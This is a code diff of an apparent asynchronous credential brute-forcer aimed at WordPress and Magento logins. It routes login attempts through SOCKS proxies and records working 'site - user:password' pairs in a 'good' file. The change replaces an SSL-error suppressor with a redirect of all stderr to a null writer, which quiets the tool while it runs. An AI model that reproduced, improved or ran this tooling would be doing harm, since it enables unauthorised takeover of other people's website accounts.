@@ -1,10 +1,9 @@
 # -*- coding: utf-8 -*-
 
 import asyncio
-import contextlib
 from json import loads
 from re import match
-from ssl import SSLError
+from contextlib import redirect_stderr
 from urllib.parse import urlsplit
 
 from aiofiles import open as afile
@@ -19,26 +18,8 @@ from magento import Magento
 from wordpress import WordPress
 
 
-@contextlib.contextmanager
-def silent_out():
-    loop = asyncio.get_event_loop()
-    old_handler = loop.get_exception_handler()
-    old_handler_fn = old_handler
-
-    def ignore_exc(_loop, ctx):
-        exc = ctx.get('exception')
-
-        if isinstance(exc, SSLError):
-            return
-
-        old_handler_fn(loop, ctx)
-
-    loop.set_exception_handler(ignore_exc)
-
-    try:
-        yield
-    finally:
-        loop.set_exception_handler(old_handler)
+class Devnull(object):
+    def write(self, *_): pass
 
 
 def macros(p, u, s):
@@ -91,25 +72,24 @@ async def process(link, user, passw, proxy):
         user = macros(user, link, '')
         passw = macros(passw, link, user)
 
-        with silent_out():
-            async with ClientSession(connector=cproxy, timeout=timeout) as s:
-                data = await first(s, link)
+        async with ClientSession(connector=cproxy, timeout=timeout) as s:
+            data = await first(s, link)
 
-                if not module.valid(data[1], data[0]):
-                    await save('rebrut', f'{link} - {user}:{passw}')
-                    return
+            if not module.valid(data[1], data[0]):
+                await save('rebrut', f'{link} - {user}:{passw}')
+                return
 
-                _post = module.parse(data[0], user, passw)
+            _post = module.parse(data[0], user, passw)
 
-                if _post is None:
-                    await save('rebrut', f'{link} - {user}:{passw}')
-                    return
+            if _post is None:
+                await save('rebrut', f'{link} - {user}:{passw}')
+                return
 
-                data = await second(s, link, _post)
-                assert module.required in data[0]
+            data = await second(s, link, _post)
+            assert module.required in data[0]
 
-                await save('good', f'{link} - {user}:{passw}')
-                good += 1
+            await save('good', f'{link} - {user}:{passw}')
+            good += 1
     except (SocksConnectionError, SocksError):
         await save('rebrut', f'{link} - {user}:{passw}')
     except asyncio.TimeoutError:
@@ -193,4 +173,5 @@ if __name__ == "__main__":
         )
     ]
 
-    asyncio.run(main())
+    with redirect_stderr(Devnull()):
+        asyncio.run(main())
